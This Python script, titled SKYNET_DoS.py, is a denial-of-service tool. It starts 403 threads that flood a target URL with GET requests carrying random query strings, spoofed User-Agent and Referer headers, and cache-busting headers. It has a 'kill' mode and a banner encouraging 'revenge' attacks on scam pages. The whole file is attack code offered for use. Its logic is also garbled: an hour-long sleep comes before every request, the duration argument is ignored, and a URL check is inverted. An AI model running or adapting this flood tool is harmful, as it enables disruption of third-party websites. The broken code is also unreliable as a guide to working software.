import threading as ddos
import time
import random as global_alias
import re
import sys
import requests  # Import the requests library

class DDoS:
    url = ""
    host = ""
    port = -1
    headers_user_agents = []
    headers_referers = []
    request_counter = 0  # Set request_counter to 0 initially
    flag = 0
    kill = 0
    attack_duration = 3600  # Set attack_duration to 1 hour
    pause_duration = 3600  # Set pause duration to 1 hour
    response_delay = 3600  # Set response_delay to 1 hour
    lock_object = ddos.Lock()
    message_printed = True
    attack_start_time = time.time()
    attack_end_time = attack_start_time + 3600  # Set attack_end_time to 1 hour after attack_start_time

    @classmethod
    def inc_counter(cls):
        with cls.lock_object:
            cls.request_counter += 1

    @classmethod
    def set_flag(cls, val):
        with cls.lock_object:
            cls.flag = val

    @classmethod
    def set_kill(cls):
        with cls.lock_object:
            cls.kill = 1

    @classmethod
    def user_agent_list(cls):
        cls.headers_user_agents.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
        # ... (remaining user agents)

    @classmethod
    def referer_list(cls):
        cls.headers_referers.append("http://www.google.com/?q=")  # Change to HTTP
        # ... (remaining referers)

    @classmethod
    def build_block(cls, size):
        random_str = ''.join(global_alias.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(size))
        return random_str

    @classmethod
    def usage(cls):
        print("\033[91m" + "" * 51)
        print("WARNING SKYNET IS POWERFUL PROGRAM DENIAL OF SERVICE IT CAN HARM YOUR WEBSITE")
        print("SKYNET_DoS.py <url> [port] [attack_duration_in_hour]")
        print("you can add 'kill' after url, to autoshut after dos")
        print("MAKE YOUR OWN RISK DESTROY EVERYTHING")
        print("USE FOR GOOD THING&& DONT USE FOR BAD THINGS&& DESTROY REVENGE FOR SCAM PAGE")
        print("" * 51 + "\033[0m")

    @classmethod
    def http_call(cls, url):
        cls.user_agent_list()
        cls.referer_list()
        code = 0
        param_joiner = '&' if '?' in url else '?'
        random_param = f"{cls.build_block(global_alias.randint(8, 10))}={cls.build_block(global_alias.randint(8, 10))}"
        try:
            target_url = f"{url}{param_joiner}{random_param}"
            headers = {
                "User-Agent": global_alias.choice(cls.headers_user_agents),
                "Cache-Control": "no-cache",
                "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
                "Referer": global_alias.choice(cls.headers_referers) + cls.build_block(global_alias.randint(5, 10)),
                "Keep-Alive": str(global_alias.randint(110, 120)),
                "Connection": "keep-alive",
                "Host": cls.host
            }
            desired_sleep_hours = 1  # Set the desired sleep duration to 1 hour
            start_time = time.time()  # Define start_time here
            while (time.time() - start_time) < (desired_sleep_hours * 3600):
                time.sleep(3600)  # Sleep for 1 hour



                hour_timeout = 1 * 3600  # 1 hour in seconds
                response = requests.get(target_url, headers=headers, timeout=hour_timeout)  # Use requests.get
                code = response.status_code

                cls.inc_counter()

                if not cls.message_printed:
                    print("\033[91m\nHigh Power Attack has been broadcast to all devices...")
                    cls.message_printed = True
        except requests.RequestException as ex:  # Change to requests.RequestException 
            print(f"Request Exception: {ex}")

        except Exception as ex:
            print(f"An unexpected exception occurred: {ex}")
        if not cls.message_printed:
            print("\033[91m\nTHIS TESTING THE WEBSITE IF CAN KILL ANY PROTECTIONS...")
            cls.message_printed = True
        return code

    @classmethod
    def main(cls):
        if len(sys.argv) < 2:
            cls.usage()
            sys.exit(0)
        else:
            if "help" == sys.argv[1]:
                cls.usage()
                sys.exit(0)
            else:
                print("-- DDoS Attack Started --")
                cls.attack_start_time = time.time()

                if len(sys.argv) >= 3:
                    try:
                        cls.port = int(sys.argv[2])
                    except ValueError:
                        print("Invalid port number. Using default port.")

                if len(sys.argv) >= 4:
                    try:
                        cls.attack_duration = 1  # 1 hours
                    except ValueError:
                        print("Invalid attack duration. Using default duration.")

                if len(sys.argv) >= 5:
                    if "kill" == sys.argv[4]:
                        cls.set_kill()

                cls.url = sys.argv[1]
                attack_duration_hours = 1  # Set the attack duration to 1 hour
                attack_duration_seconds = 0

                print(f"Target URL: {cls.url}, Port: {'Automatic' if cls.port == -1 else cls.port}, Attack Duration: {attack_duration_hours} hours and {attack_duration_seconds} seconds")

                if "/" in cls.url:
                    cls.url = cls.url + "/"

                pattern = r"http://([^/:]*)[:/]?.*"
                regex_pattern = re.compile(pattern)
                matcher = regex_pattern.match(cls.url)

                if matcher:
                    cls.host = matcher.group(1)
                else:
                    print("Error: Unable to extract host from URL.")
                    sys.exit(0)

                # Start the threads
                for i in range(403):
                    t = ddos.Thread(target=cls.http_thread)
                    t.start()

                monitor_thread = ddos.Thread(target=cls.monitor_thread)
                monitor_thread.start()

                # Prevent the main thread from exiting immediately
                try:
                    time.sleep(3600)
                except KeyboardInterrupt:
                    pass

    @classmethod
    def http_thread(cls):
        try:
            start_time = time.time()
            end_time = start_time + 3600  # Set the end time to 1 hour from the start time
            while cls.flag < 2 and time.time() < end_time:
                code = cls.http_call(cls.url)
                if code == 403 and cls.kill == 1:
                    cls.set_flag(2)

            print("\033[91m" + "*" * 51)
            print("\n-- High Power Attack has been broadcasted to all devices... --")
            print("\n-- High Power Attack completed. System may experience downtime. --")
            print("-" * 51 + "\033[0m")
            time.sleep(3600)  # Sleep for 1 hour
        except Exception as ex:
            print(ex)

    @classmethod
    def monitor_thread(cls):
        previous = cls.request_counter
        while cls.flag == 0:
            if previous + 100 < cls.request_counter and previous != cls.request_counter:
                print(f"{cls.request_counter} High Power Attack has been broadcast to all devices...")
                previous = cls.request_counter
        if cls.flag == 2:
            attack_duration_hours = 1  # Set the attack duration to 1 hour
            attack_duration_seconds = 0
            print("\n-- DDoS Attack Finished --")
            print(f"-- Total Attack Duration: {attack_duration_hours} hours and {attack_duration_seconds} seconds --")

if __name__ == "__main__":
    DDoS.main()
